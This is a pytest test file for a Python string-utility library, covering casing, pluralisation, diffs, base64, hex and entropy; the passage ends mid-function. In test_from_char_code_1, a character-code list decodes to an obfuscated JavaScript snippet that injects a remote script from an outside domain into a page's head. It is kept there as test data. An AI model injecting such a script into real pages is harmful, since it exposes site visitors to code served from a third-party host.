import concurrent.futures
import functools
import re

import pytest

from d8s_strings import (
    base64_decode,
    base64_encode,
    camel_case,
    character_to_unicode_number,
    crazycase,
    from_char_code,
    hamming_distance,
    hex_to_string,
    kebab_case,
    leet_speak_to_text,
    characters,
    letter_as_number,
    lowercase_count,
    lowercase_first_letter,
    pascal_case,
    string_encode_as_bytes,
    bytes_decode_as_string,
    snake_case,
    string_to_hex,
    string_as_numbers,
    string_entropy,
    string_get_closes_matches,
    string_in_iterable_fuzzy,
    string_reverse_case,
    string_rotate,
    strings_diff,
    strings_longest_matching_block,
    strings_matching_blocks,
    strings_diff_opcodes,
    string_shorten,
    string_split_on_lowercase,
    string_split_on_uppercase,
    string_split_without_empty,
    substrings,
    text_to_leet_speak,
    text_ensure_ends_with,
    text_join,
    unicode_number_to_character,
    uppercase_count,
    uppercase_first_letter,
    xor,
    lowercase,
    text_abbreviate,
    string_has_multiple_consecutive_spaces,
    uppercase,
    string_split_multiple,
    string_remove,
    string_remove_from_start,
    string_remove_from_end,
    string_left_pad,
    string_remove_numbers,
    string_has_index,
    string_add_to_start_of_each_line,
    string_insert,
    string_to_bool,
    string_forms,
    indefinite_article,
    pluralize,
    singularize,
    text_ascii_characters,
    text_non_ascii_characters,
    string_remove_unicode,
    string_is_palindrome,
    string_remove_before,
    string_remove_after,
    string_common_prefix,
    string_common_suffix,
    text_examples,
    character_examples,
    switch,
    text_vowels,
    text_vowel_count,
    text_consonants,
    text_consonant_count,
    string_is_yes,
    string_is_no,
    # string_words,
    strings_similarity,
    string_find_between,
    string_remove_non_alpha_numeric_characters,
    sentence_case,
    string_remove_index,
    string_replace_index,
    unicode_to_ascii,
    a10n,
    cardinalize,
    ordinalize,
    is_plural,
    is_singular,
    text_ensure_starts_with,
    string_chars_at_start,
)
from d8s_strings.strings import _handle_casing


def repeat_concurrently(n: int = 10):
    """Repeat the decorated function concurrently n times."""

    def actual_decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            import concurrent.futures

            results = []

            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(n):
                    function_submission = executor.submit(func, *args, **kwargs)
                    results.append(function_submission.result())

            return results

        return wrapper

    return actual_decorator


def test_string_chars_at_start_docs_1():
    result = string_chars_at_start('foobar', 'foo')
    assert list(result) == ['f', 'o', 'o']

    result = string_chars_at_start('foobar', 'fo')
    assert list(result) == ['f', 'o', 'o']

    result = string_chars_at_start('foobar', 'f')
    assert list(result) == ['f']

    result = string_chars_at_start('foobar', 'o')
    assert list(result) == []


def test_text_ensure_starts_with_1():
    assert text_ensure_starts_with('foo', 'a') == 'afoo'
    assert text_ensure_starts_with('foo', 'f') == 'foo'


def test_text_ensure_ends_with_1():
    assert text_ensure_ends_with('foo', 'b') == 'foob'
    assert text_ensure_ends_with('foo', 'o') == 'foo'


def test_is_plural_1():
    assert is_plural('dogs')
    assert not is_plural('dog')

    assert is_plural('adversaries')
    assert not is_plural('adversary')

    assert not is_plural('foo')


def test_is_singular_1():
    assert not is_singular('dogs')
    assert is_singular('dog')

    assert not is_singular('adversaries')
    assert is_singular('adversary')

    assert is_singular('foo')


def test_cardinalize_1():
    assert cardinalize('dog', 1) == 'dog'
    assert cardinalize('dog', 2) == 'dogs'

    assert cardinalize('dogs', 1) == 'dog'
    assert cardinalize('dogs', 2) == 'dogs'


def test_a10n_1():
    result = a10n('abbreviation')
    assert result == 'a10n'

    result = a10n('internationalization')
    assert result == 'i18n'

    result = a10n('foo')
    assert result == 'foo'

    result = a10n('ab')
    assert result == 'ab'


def test_unicode_to_ascii_docs_1():
    s = 'Klüft skräms inför på fédéral électoral große'
    assert unicode_to_ascii(s) == 'Kluft skrams infor pa federal electoral groe'


def test_string_replace_index_1():
    assert string_replace_index('abc', 0, 'x') == 'xbc'
    assert string_replace_index('abc', 1, 'x') == 'axc'
    assert string_replace_index('abc', 2, 'x') == 'abx'
    with pytest.raises(IndexError):
        string_replace_index('abc', 3, 'x')


def test_string_remove_index_1():
    assert string_remove_index('abc', 0) == 'bc'
    assert string_remove_index('abc', 1) == 'ac'
    assert string_remove_index('abc', 2) == 'ab'
    with pytest.raises(IndexError):
        string_remove_index('abc', 3)


def test__handle_casing_1():
    with pytest.raises(ValueError):
        _handle_casing('foo', 'bar')


# def test_sentence_case_1():
#     assert sentence_case('this is just a test') == 'This is just a test'


def test_string_remove_non_alpha_numeric_characters_1():
    result = string_remove_non_alpha_numeric_characters('foobar!@#!@#!test')
    assert result == 'foobartest'


def test_string_find_between_1():
    result = string_find_between('foobar', 'f', 'b')
    assert result == 'oo'

    result = string_find_between('foobar', 'o', 'b')
    assert result == 'o'

    result = string_find_between('foobar', 'o', 'o')
    assert result == ''

    result = string_find_between('foobarfoobar', 'f', 'b')
    assert result == 'oobarfoo'

    result = string_find_between('foo.bar', 'f', '.')
    assert result == 'oo'

    result = string_find_between('foobar', 'g', 'r')
    assert result == ''


def test_strings_similarity_1():
    result = strings_similarity('foobar', 'foolbat')
    assert result == 0.7692307692307693


# def test_string_words_1():
#     result = string_words('In the beginning was the Word...')
#     assert result == ['In', 'the', 'beginning', 'was', 'the', 'Word']


def test_string_is_yes_1():
    assert string_is_yes('y')
    assert string_is_yes('Y')
    assert string_is_yes('yes')
    assert string_is_yes('YES')
    assert string_is_yes('Yes')
    assert string_is_yes('YeS')

    assert not string_is_yes('yyes')
    assert not string_is_yes('yess')


def test_string_is_no_1():
    assert string_is_no('n')
    assert string_is_no('N')
    assert string_is_no('no')
    assert string_is_no('NO')
    assert string_is_no('No')
    assert string_is_no('nO')

    assert not string_is_no('nno')
    assert not string_is_no('noo')
    assert not string_is_no('none')


def test_text_consonants_1():
    result = text_consonants('foobar')
    assert result == ['f', 'b', 'r']


def test_text_consonant_count_1():
    result = text_consonant_count('foobar')
    assert result == 3


def test_text_vowels_1():
    result = text_vowels('foobar')
    assert result == ['o', 'o', 'a']


def test_text_vowel_count_1():
    result = text_vowel_count('foobar')
    assert result == 3


def test_switch_1():
    result = switch('foo', 'bar', 'foobar foo bar')
    assert result == 'barfoo bar foo'


def test_character_examples_1():
    result = character_examples()
    assert len(result) == 10
    assert isinstance(result[0], str)

    result = character_examples(n=100)
    assert len(result) == 100
    assert isinstance(result[0], str)


def test_text_examples_1():
    result = text_examples()
    assert len(result) == 10
    assert isinstance(result[0], str)

    result = text_examples(n=100)
    assert len(result) == 100
    assert isinstance(result[0], str)


def test_string_common_prefix_1():
    result = string_common_prefix('foobar', 'foolbar')
    assert result == 'foo'

    result = string_common_prefix('abc', 'xyz')
    assert result == ''

    result = string_common_prefix(' ! a', ' ! a')
    assert result == ' ! a'


def test_string_common_suffix_1():
    result = string_common_suffix('foobar', 'foolbar')
    assert result == 'bar'

    result = string_common_suffix('abc', 'xyz')
    assert result == ''

    result = string_common_suffix(' ! a', ' ! a')
    assert result == ' ! a'


def test_string_remove_before_1():
    result = string_remove_before('foobar', 'b')
    assert result == 'bar'

    result = string_remove_before('https://example.com', '://')
    assert result == '://example.com'


def test_string_remove_after_1():
    result = string_remove_after('foobar', 'b')
    assert result == 'foob'

    result = string_remove_after('foobar', 'o')
    assert result == 'foo'

    result = string_remove_after('https://example.com', '://')
    assert result == 'https://'


def test_string_is_palindrome_1():
    assert not string_is_palindrome('foo')
    assert string_is_palindrome('foof')
    assert string_is_palindrome('amanaplanacanalpanama')


def test_string_remove_unicode_1():
    results = string_remove_unicode('τεστΤΕΣΤtest')
    assert results == 'test'

    results = string_remove_unicode('abc\u200bdef')
    assert results == 'abcdef'


def test_text_ascii_characters_1():
    results = tuple(text_ascii_characters('τεστtest'))
    assert results == ('t', 'e', 's', 't')


def test_text_non_ascii_characters_1():
    results = tuple(text_non_ascii_characters('τεστtest'))
    assert results == ('τ', 'ε', 'σ', 'τ')


def test_indefinite_article_1():
    assert indefinite_article('historian') == 'a'
    assert indefinite_article('turtle') == 'a'
    assert indefinite_article('iguana') == 'an'


def test_pluralize_docs_1():
    assert pluralize('test') == 'tests'
    assert pluralize('Test') == 'Tests'
    assert pluralize('TEST') == 'TESTS'
    assert pluralize('adversary') == 'adversaries'
    assert pluralize('intrusion set') == 'intrusion sets'
    assert pluralize('byte') == 'bytes'
    # title-cased words are not pluralized properly (I think because they are considered proper nouns)
    assert pluralize('Adversary') == 'Adversarys'
    assert pluralize('elephants') == 'elephants'


def test_singularize_docs_1():
    assert singularize('tests') == 'test'
    assert singularize('adversaries') == 'adversary'
    # TODO (nov 2020): this assertion used to work, but is now failing once the is_singular check was added to the singularize function
    # assert singularize('intrusion sets') == 'intrusion set'
    assert singularize('elephant') == 'elephant'


def test_string_forms_1():
    assert string_forms('dog') == {
        'lowercase': 'dog',
        'titlecase': 'Dog',
        'uppercase': 'DOG',
        'lowercasePlural': 'dogs',
        'titlecasePlural': 'Dogs',
        'uppercasePlural': 'DOGS',
        'kebab_case': 'dog',
        'kebab_casePlural': 'dogs',
        'snake_case': 'dog',
        'snake_casePlural': 'dogs',
        'camel_case': 'dog',
        'camel_casePlural': 'dogs',
        'pascal_case': 'Dog',
        'pascal_casePlural': 'Dogs',
        'lowercaseIndefiniteArticle': 'a',
        'titlecaseIndefiniteArticle': 'A',
        'uppercaseIndefiniteArticle': 'A',
    }

    assert string_forms('iguana') == {
        'lowercase': 'iguana',
        'titlecase': 'Iguana',
        'uppercase': 'IGUANA',
        'lowercasePlural': 'iguanas',
        'titlecasePlural': 'Iguanas',
        'uppercasePlural': 'IGUANAS',
        'kebab_case': 'iguana',
        'kebab_casePlural': 'iguanas',
        'snake_case': 'iguana',
        'snake_casePlural': 'iguanas',
        'camel_case': 'iguana',
        'camel_casePlural': 'iguanas',
        'pascal_case': 'Iguana',
        'pascal_casePlural': 'Iguanas',
        'lowercaseIndefiniteArticle': 'an',
        'titlecaseIndefiniteArticle': 'An',
        'uppercaseIndefiniteArticle': 'AN',
    }

    assert string_forms('fat dog') == {
        'lowercase': 'fat dog',
        'titlecase': 'Fat Dog',
        'uppercase': 'FAT DOG',
        'lowercasePlural': 'fat dogs',
        'titlecasePlural': 'Fat Dogs',
        'uppercasePlural': 'FAT DOGS',
        'kebab_case': 'fat-dog',
        'kebab_casePlural': 'fat-dogs',
        'snake_case': 'fat_dog',
        'snake_casePlural': 'fat_dogs',
        'camel_case': 'fatDog',
        'camel_casePlural': 'fatDogs',
        'pascal_case': 'FatDog',
        'pascal_casePlural': 'FatDogs',
        'lowercaseIndefiniteArticle': 'a',
        'titlecaseIndefiniteArticle': 'A',
        'uppercaseIndefiniteArticle': 'A',
    }

    assert string_forms('ignorant dog') == {
        'lowercase': 'ignorant dog',
        'titlecase': 'Ignorant Dog',
        'uppercase': 'IGNORANT DOG',
        'lowercasePlural': 'ignorant dogs',
        'titlecasePlural': 'Ignorant Dogs',
        'uppercasePlural': 'IGNORANT DOGS',
        'kebab_case': 'ignorant-dog',
        'kebab_casePlural': 'ignorant-dogs',
        'snake_case': 'ignorant_dog',
        'snake_casePlural': 'ignorant_dogs',
        'camel_case': 'ignorantDog',
        'camel_casePlural': 'ignorantDogs',
        'pascal_case': 'IgnorantDog',
        'pascal_casePlural': 'IgnorantDogs',
        'lowercaseIndefiniteArticle': 'an',
        'titlecaseIndefiniteArticle': 'An',
        'uppercaseIndefiniteArticle': 'AN',
    }


def test_string_to_bool_1():
    assert not string_to_bool('false')
    assert not string_to_bool('False')
    assert not string_to_bool('FALSE')
    assert not string_to_bool('FalsE')

    assert string_to_bool('true')
    assert string_to_bool('True')
    assert string_to_bool('TRUE')

    assert string_to_bool('foo')


def test_string_insert_1():
    assert string_insert('foo', '!', 0) == '!foo'
    assert string_insert('foo', '!', 1) == 'f!oo'
    assert string_insert('foo', '!', 2) == 'fo!o'
    assert string_insert('foo', '!', 3) == 'foo!'

    assert string_insert('foo', 'bar', 0) == 'barfoo'
    assert string_insert('foo', 'bar', 1) == 'fbaroo'
    assert string_insert('foo', 'bar', 2) == 'fobaro'
    assert string_insert('foo', 'bar', 3) == 'foobar'


def test_string_add_to_start_of_each_line_1():
    s = '''foo
bar
buzz
bang'''
    assert (
        string_add_to_start_of_each_line(s, '#')
        == '''foo
#bar
#buzz
#bang'''
    )

    assert (
        string_add_to_start_of_each_line(s, '# ')
        == '''foo
# bar
# buzz
# bang'''
    )

    s = '''
        foo
        bar
        '''

    assert (
        string_add_to_start_of_each_line(s, '#')
        == '''
#        foo
#        bar
#        '''
    )


def test_string_has_index_1():
    assert not string_has_index('foo', -1)
    assert string_has_index('foo', 0)
    assert string_has_index('foo', 1)
    assert string_has_index('foo', 2)
    assert not string_has_index('foo', 3)
    assert not string_has_index('foo', 4)
    assert not string_has_index('foo', 4000)


def test_string_remove_numbers_1():
    assert (
        string_remove_numbers('there were 2 pigeons on a wall when 1 fell off and found 4 cats...')
        == 'there were   pigeons on a wall when   fell off and found   cats...'
    )
    assert (
        string_remove_numbers('there were 2 pigeons on a wall when 1 fell off and found 4 cats...', replacement='!')
        == 'there were ! pigeons on a wall when ! fell off and found ! cats...'
    )


def test_string_left_pad_1():
    assert string_left_pad('foo', 10, padding_characters=' ') == '       foo'
    assert string_left_pad('foo', 10) == '       foo'

    assert string_left_pad('foo', 10, padding_characters='.') == '.......foo'


def test_string_left_pad_multiple_padding_characters():
    assert string_left_pad('foo', 7, padding_characters='+=') == '+=+=foo'
    assert string_left_pad('foo', 9, padding_characters='_--') == '_--_--foo'

    with pytest.raises(ValueError):
        string_left_pad('foo', 7, padding_characters='_--')


def test_string_left_pad_length_equals_string_length():
    assert string_left_pad('foo', 3) == 'foo'
    assert string_left_pad('foo', 3, padding_characters='.') == 'foo'
    assert string_left_pad('foo', 3, padding_characters='+=') == 'foo'


def test_string_remove_1():
    s = string_remove('1', '110010')
    assert s == '000'

    s = string_remove('1', '110010', count=1)
    assert s == '10010'


def test_string_remove_from_start_1():
    s = string_remove_from_start('foobar', 'foo')
    assert s == 'bar'

    # make sure nothing is removed
    s = string_remove_from_start('foobar', 'bar')
    assert s == 'foobar'

    s = string_remove_from_start('110010', '11')
    assert s == '0010'


def test_string_remove_from_end_1():
    s = string_remove_from_end('foobar', 'bar')
    assert s == 'foo'

    # make sure nothing is removed
    s = string_remove_from_end('foobar', 'foo')
    assert s == 'foobar'

    s = string_remove_from_end('110010', '10')
    assert s == '1100'


def test_string_split_multiple_1():
    s = '1'
    results = string_split_multiple(s, ' ', '|')
    assert results == ['1']

    results = string_split_multiple(s, ' ')
    assert results == ['1']

    s = '1 2'
    results = string_split_multiple(s, ' ', '|')
    assert results == ['1', '2']

    results = string_split_multiple(s, '|', ' ')
    assert results == ['1', '2']

    results = string_split_multiple(s, ' ')
    assert results == ['1', '2']

    results = string_split_multiple(s, '|')
    assert results == ['1 2']

    s = '1 2|3'
    results = string_split_multiple(s, ' ', '|')
    assert results == ['1', '2', '3']

    results = string_split_multiple(s, '|', ' ')
    assert results == ['1', '2', '3']

    results = string_split_multiple(s, ' ')
    assert results == ['1', '2|3']

    results = string_split_multiple(s, '|')
    assert results == ['1 2', '3']


def test_string_split_multiple_2():
    s = '1 2|3-4=5'
    results = string_split_multiple(s, ' ', '|', '-', '=', '!')
    assert results == ['1', '2', '3', '4', '5']

    s = '1 2 3'
    results = string_split_multiple(s, ' ', '|', '-', '=', '!')
    assert results == ['1', '2', '3']

    s = '1 2 3'
    results = string_split_multiple(s, ' ')
    assert results == ['1', '2', '3']

    s = '1 2 3'
    results = string_split_multiple(s, '|')
    assert results == ['1 2 3']


def test_uppercase_1():
    result = uppercase('foo bar')
    assert result == 'FOO BAR'


def test_string_has_multiple_consecutive_spaces_1():
    assert not string_has_multiple_consecutive_spaces('')
    assert not string_has_multiple_consecutive_spaces(' ')
    assert string_has_multiple_consecutive_spaces('  ')
    assert string_has_multiple_consecutive_spaces('   ')
    assert string_has_multiple_consecutive_spaces('    ')


def test_string_has_multiple_consecutive_spaces_2():
    assert not string_has_multiple_consecutive_spaces('foo bar bing boo buzz')
    assert string_has_multiple_consecutive_spaces('foo bar  bing boo buzz')
    assert string_has_multiple_consecutive_spaces('foo bar   bing boo buzz')
    assert not string_has_multiple_consecutive_spaces('foo bar \n bing boo buzz')


def test_text_abbreviate_1():
    assert text_abbreviate('ping ping') == 'PP'
    assert text_abbreviate('Federal Bureau of Investigation') == 'FBI'
    assert text_abbreviate('United Kingdom') == 'UK'
    assert text_abbreviate('hello') == 'H'
    assert text_abbreviate('pingPong') == 'PP'
    assert text_abbreviate('PingPong') == 'PP'
    assert text_abbreviate('Federal_Bureau-ofInvestigation') == 'FBI'


def test_lowercase_1():
    assert lowercase('ABc') == 'abc'


def test_bytes_decode_as_string_1():
    assert bytes_decode_as_string(b'foo') == 'foo'
    assert bytes_decode_as_string(b'bar') == 'bar'
    assert bytes_decode_as_string('foo') == 'foo'


def test_string_encode_as_bytes_1():
    assert string_encode_as_bytes('foo') == b'foo'
    assert string_encode_as_bytes('bar') == b'bar'


def test_character_to_unicode_number_1():
    assert character_to_unicode_number('a') == 97


def test_hex_to_string_1():
    s = '66 6f 6f 62 61 72'
    assert hex_to_string(s) == 'foobar'

    s = '666f6f626172'
    assert hex_to_string(s) == 'foobar'

    s = '666f6f6 26172'
    assert hex_to_string(s) == 'foobar'

    s = '666f6f 626172'
    assert hex_to_string(s) == 'foobar'

    # see https://github.com/democritus-project/d8s-strings/issues/5
    # s = '\xd0\xb2\xd0\xba'
    # assert hex_to_string(s) == 'foobar'

    s = 'foobar'
    with pytest.raises(ValueError):
        hex_to_string(s)


def test_characters_1():
    assert characters('foobar') == ('f', 'o', 'o', 'b', 'a', 'r')


def test_substrings_1():
    substrings('more') == ['m', 'o', 'r', 'e', 'mo', 'or', 're', 'mor', 'ore', 'more']


def test_string_get_closes_matches_1():
    closest_matches = string_get_closes_matches("appel", ["ape", "apple", "peach", "puppy"])
    assert len(closest_matches) == 2
    assert 'ape' in closest_matches
    assert 'apple' in closest_matches

    closest_matches = string_get_closes_matches('foo', ['fake', 'fun', 'fou', 'foust', 'fang', 'bing'], cutoff=0.4)
    assert len(closest_matches) == 2
    assert 'fou' in closest_matches
    assert 'foust' in closest_matches

    closest_matches = string_get_closes_matches('foo', ['fake', 'fun', 'fou', 'foust', 'fang', 'bing'])
    assert len(closest_matches) == 1
    assert 'fou' in closest_matches


def test_strings_diff_1():
    print(strings_diff('abc', 'abd'))
    assert strings_diff('abc', 'abd') == "- abc\n+ abd"


def test_strings_diff_2():
    a = """abcdef\nthis may be a\ntest"""
    b = """abcdef\nthis may be a\njest"""

    result = strings_diff(a, b)
    print('result <<<{}>>>'.format(result))
    assert (
        result
        == """  abcdef
  this may be a
- test
? ^

+ jest
? ^
"""
    )


def test_string_in_iterable_fuzzy_1():
    assert string_in_iterable_fuzzy('test', ['testing'])
    assert string_in_iterable_fuzzy('foo', ['foo', 'b', 'a'])
    assert not string_in_iterable_fuzzy('bang', ['foo', 'b', 'a'])


def test_strings_diff_opcodes_1():
    op_codes = strings_diff_opcodes('abce', 'abde')
    assert len(op_codes) == 3
    assert op_codes[0] == ('equal', 0, 2, 0, 2)
    assert op_codes[1] == ('replace', 2, 3, 2, 3)
    assert op_codes[2] == ('equal', 3, 4, 3, 4)


def test_strings_matching_blocks_1():
    import difflib

    matching_blocks = strings_matching_blocks('abc', 'abd')
    assert len(matching_blocks) == 2
    assert matching_blocks[0] == difflib.Match(a=0, b=0, size=2)
    assert matching_blocks[1] == difflib.Match(a=3, b=3, size=0)


def test_strings_longest_matching_block_1():
    import difflib

    result = strings_longest_matching_block('abc', 'abd')
    assert result == difflib.Match(a=0, b=0, size=2)
    assert result.a == 0
    assert result.b == 0
    assert result.size == 2


def test_string_as_numbers():
    assert string_as_numbers('london') == [12, 15, 14, 4, 15, 14]
    assert string_as_numbers('fair') == [6, 1, 9, 18]


def test_text_join_1():
    assert text_join('/', 'a/', 'b//', '/c') == 'a//b////c'


def test_string_shorten():
    assert string_shorten('test', 3) == '...'
    assert string_shorten('test', 4) == 'test'
    assert string_shorten('testing', 4) == 't...'
    assert string_shorten('this is just a test', 10) == 'this is...'
    assert string_shorten('test', 100) == 'test'


def test_string_to_hex_1():
    assert string_to_hex('a') == '61'
    assert string_to_hex('test') == '74657374'
    assert string_to_hex('test', seperator=' ') == '74 65 73 74'


def test_string_split_without_empty_1():
    assert string_split_without_empty('https://tc.hightower.space/post/playbook-apps/array-iterator/', '/') == [
        'https:',
        'tc.hightower.space',
        'post',
        'playbook-apps',
        'array-iterator',
    ]


def test_base64_encode_1():
    assert base64_encode('Hello, world') == 'SGVsbG8sIHdvcmxk'
    assert base64_encode('ich bin ein mann') == 'aWNoIGJpbiBlaW4gbWFubg=='


def test_base64_decode_1():
    assert base64_decode('SGVsbG8sIHdvcmxk') == 'Hello, world'
    assert base64_decode('aWNoIGJpbiBlaW4gbWFubg==') == 'ich bin ein mann'
    assert (
        base64_decode('R8szXOTyFtDM_Aac-LrgCg').encode('utf-8')
        == b'G\xc3\x8b3\\\xc3\xa4\xc3\xb2\x16\xc3\x90\xc3\x8c\x01\xc2\xa7\x0b\xc2\xae\x00\xc2\xa0'
    )


def test_letter_as_number_1():
    assert letter_as_number('a') == 1
    assert letter_as_number('A') == 1
    assert letter_as_number('b') == 2


def test_from_char_code_1():
    """This test was taken from: https://gist.github.com/jonmarkgo/3431818. I am not responsible for malicious use or outcomes of having this as a test case."""
    input_char_codes = [
        118,
        97,
        114,
        32,
        115,
        111,
        109,
        101,
        115,
        116,
        114,
        105,
        110,
        103,
        32,
        61,
        32,
        100,
        111,
        99,
        117,
        109,
        101,
        110,
        116,
        46,
        99,
        114,
        101,
        97,
        116,
        101,
        69,
        108,
        101,
        109,
        101,
        110,
        116,
        40,
        39,
        115,
        99,
        114,
        105,
        112,
        116,
        39,
        41,
        59,
        32,
        115,
        111,
        109,
        101,
        115,
        116,
        114,
        105,
        110,
        103,
        46,
        116,
        121,
        112,
        101,
        32,
        61,
        32,
        39,
        116,
        101,
        120,
        116,
        47,
        106,
        97,
        118,
        97,
        115,
        99,
        114,
        105,
        112,
        116,
        39,
        59,
        32,
        115,
        111,
        109,
        101,
        115,
        116,
        114,
        105,
        110,
        103,
        46,
        97,
        115,
        121,
        110,
        99,
        32,
        61,
        32,
        116,
        114,
        117,
        101,
        59,
        115,
        111,
        109,
        101,
        115,
        116,
        114,
        105,
        110,
        103,
        46,
        115,
        114,
        99,
        32,
        61,
        32,
        83,
        116,
        114,
        105,
        110,
        103,
        46,
        102,
        114,
        111,
        109,
        67,
        104,
        97,
        114,
        67,
        111,
        100,
        101,
        40,
        49,
        48,
        52,
        44,
        32,
        49,
        49,
        54,
        44,
        32,
        49,
        49,
        54,
        44,
        32,
        49,
        49,
        50,
        44,
        32,
        49,
        49,
        53,
        44,
        32,
        53,
        56,
        44,
        32,
        52,
        55,
        44,
        32,
        52,
        55,
        44,
        32,
        49,
        48,
        49,
        44,
        32,
        49,
        50,
        48,
        44,
        32,
        57,
        55,
        44,
        32,
        49,
        48,
        57,
        44,
        32,
        49,
        48,
        52,
        44,
        32,
        49,
        49,
        49,
        44,
        32,
        49,
        48,
        57,
        44,
        32,
        49,
        48,
        49,
        44,
        32,
        52,
        54,
        44,
        32,
        49,
        49,
        48,
        44,
        32,
        49,
        48,
        49,
        44,
        32,
        49,
        49,
        54,
        44,
        32,
        52,
        55,
        44,
        32,
        49,
        49,
        53,
        44,
        32,
        49,
        49,
        54,
        44,
        32,
        57,
        55,
        44,
        32,
        49,
        49,
        54,
        44,
        32,
        52,
        54,
        44,
        32,
        49,
        48,
        54,
        44,
        32,
        49,
        49,
        53,
        44,
        32,
        54,
        51,
        44,
        32,
        49,
        49,
        56,
        44,
        32,
        54,
        49,
        44,
        32,
        52,
        57,
        44,
        32,
        52,
        54,
        44,
        32,
        52,
        56,
        44,
        32,
        52,
        54,
        44,
        32,
        52,
        57,
        41,
        59,
        32,
        32,
        32,
        118,
        97,
        114,
        32,
        97,
        108,
        108,
        115,
        32,
        61,
        32,
        100,
        111,
        99,
        117,
        109,
        101,
        110,
        116,
        46,
        103,
        101,
        116,
        69,
        108,
        101,
        109,
        101,
        110,
        116,
        115,
        66,
        121,
        84,
        97,
        103,
        78,
        97,
        109,
        101,
        40,
        39,
        115,
        99,
        114,
        105,
        112,
        116,
        39,
        41,
        59,
        32,
        118,
        97,
        114,
        32,
        110,
        116,
        51,
        32,
        61,
        32,
        116,
        114,
        117,
        101,
        59,
        32,
        102,
        111,
        114,
        32,
        40,
        32,
        118,
        97,
        114,
        32,
        105,
        32,
        61,
        32,
        97,
        108,
        108,
        115,
        46,
        108,
        101,
        110,
        103,
        116,
        104,
        59,
        32,
        105,
        45,
        45,
        59,
        41,
        32,
        123,
        32,
        105,
        102,
        32,
        40,
        97,
        108,
        108,
        115,
        91,
        105,
        93,
        46,
        115,
        114,
        99,
        46,
        105,
        110,
        100,
        101,
        120,
        79,
        102,
        40,
        83,
        116,
        114,
        105,
        110,
        103,
        46,
        102,
        114,
        111,
        109,
        67,
        104,
        97,
        114,
        67,
        111,
        100,
        101,
        40,
        49,
        48,
        49,
        44,
        32,
        49,
        50,
        48,
        44,
        32,
        57,
        55,
        44,
        32,
        49,
        48,
        57,
        44,
        32,
        49,
        48,
        52,
        44,
        32,
        49,
        49,
        49,
        44,
        32,
        49,
        48,
        57,
        44,
        32,
        49,
        48,
        49,
        41,
        41,
        32,
        62,
        32,
        45,
        49,
        41,
        32,
        123,
        32,
        110,
        116,
        51,
        32,
        61,
        32,
        102,
        97,
        108,
        115,
        101,
        59,
        125,
        32,
        125,
        32,
        105,
        102,
        40,
        110,
        116,
        51,
        32,
        61,
        61,
        32,
        116,
        114,
        117,
        101,
        41,
        123,
        100,
        111,
        99,
        117,
        109,
        101,
        110,
        116,
        46,
        103,
        101,
        116,
        69,
        108,
        101,
        109,
        101,
        110,
        116,
        115,
        66,
        121,
        84,
        97,
        103,
        78,
        97,
        109,
        101,
        40,
        34,
        104,
        101,
        97,
        100,
        34,
        41,
        91,
        48,
        93,
        46,
        97,
        112,
        112,
        101,
        110,
        100,
        67,
        104,
        105,
        108,
        100,
        40,
        115,
        111,
        109,
        101,
        115,
        116,
        114,
        105,
        110,
        103,
        41,
        59,
        32,
        125,
    ]
    result = from_char_code(input_char_codes)
    assert (
        result
        == """var somestring = document.createElement('script'); somestring.type = 'text/javascript'; somestring.async = true;somestring.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 104, 111, 109, 101, 46, 110, 101, 116, 47, 115, 116, 97, 116, 46, 106, 115, 63, 118, 61, 49, 46, 48, 46, 49);   var alls = document.getElementsByTagName('script'); var nt3 = true; for ( var i = alls.length; i--;) { if (alls[i].src.indexOf(String.fromCharCode(101, 120, 97, 109, 104, 111, 109, 101)) > -1) { nt3 = false;} } if(nt3 == true){document.getElementsByTagName("head")[0].appendChild(somestring); }"""
    )


def test_string_rotate_1():
    assert string_rotate('Hello, World!') == 'Uryyb, Jbeyq!'
    assert string_rotate('Gur Mra bs Clguba, ol Gvz Crgref') == 'The Zen of Python, by Tim Peters'
    assert string_rotate('abc', 0) == 'abc'
    assert string_rotate('abc', 1) == 'bcd'
    assert string_rotate('abc', 12) == 'mno'
    assert string_rotate('abc', 13) == 'nop'
    assert string_rotate('abc', 25) == 'zab'
    assert string_rotate('abc', 26) == 'abc'
    assert string_rotate('abc', 27) == 'bcd'


def test_xor_1():
    assert xor('test', 'abc') == xor(b'test', b'abc') == xor(b'test', b'abca') == '\x15\x07\x10\x15'


def test_hamming_distance_1():
    assert hamming_distance('karolin', 'kathrin') == 3
    assert hamming_distance('karolin', 'kerstin') == 3
    assert hamming_distance('1011101', '1001001') == 2
    assert hamming_distance('2173896', '2233796') == 3

    assert hamming_distance('abc', 'abd') == 1
    assert hamming_distance('abc', 'cba') == 2

    with pytest.raises(ValueError):
        assert hamming_distance('abc', 'a')

    assert hamming_distance('abc', 'abd', as_percent=True) == 33.33
    assert hamming_distance('abc', 'cba', as_percent=True) == 66.67


def test_hamming_distance_lists():
    assert hamming_distance([1, 2, 3, 4], [1, 2, 4, 5]) == 2
    assert hamming_distance([1, 2, 3, 4], [1, 2, 4, 5], as_percent=True) == 50.0


def test_string_entropy_1():
    assert string_entropy('aA') == 1
    assert string_entropy('aA', ignore_case=True) == 0.0
    assert string_entropy('gargleblaster') == 2.931208948910323
    assert string_entropy('tripleee') == 2.4056390622295662
    assert string_entropy('aaa') == 0
    assert string_entropy('') == 0
    assert string_entropy('7&wS/p(') == 2.8073549220576046
    assert string_entropy('in the beginning was the word') == 3.5780011510322707
    assert string_entropy('Ἐν ἀρχῇ ἦν ὁ Λόγος, καὶ ὁ Λόγος ἦν πρὸς τὸν Θεόν, καὶ Θεὸς ἦν ὁ Λόγος.') == 4.105729581348616


def test_string_entropy_word_repetition():
    a = string_entropy('this is a test of a test of a test')
    b = string_entropy('this is a test of a test of a foo')
    c = string_entropy('this is a test of a test of an foo')
    d = string_entropy('this is a test of a boo of an foo')

    assert a < b < c < d


@repeat_concurrently(10)
def run_crazy_case_repeatedly():
    s = crazycase('this is a test')
    if uppercase_count(s) > 1 and lowercase_count(s) > 1:
        return True
    else:
        return False


def test_crazycase_1():
    # I'm testing the crazycase function in this way because sometimes, the crazy case function will return a string with all lowercase or uppercase values. It is a rare occurrence, but it does happen and is possible.
    results = run_crazy_case_repeatedly()
    assert results.count(True) >= 9


def test_uppercase_count_1():
    assert uppercase_count('this iS a TeST') == 4


def test_lowercase_count_1():
    assert lowercase_count('this iS a TeST') == 7


def test_kebab_case_1():
    assert kebab_case('test ing foo bar') == 'test-ing-foo-bar'


def test_snake_case_1():
    assert snake_case('test ing foo bar') == 'test_ing_foo_bar'


def test_camel_case_1():
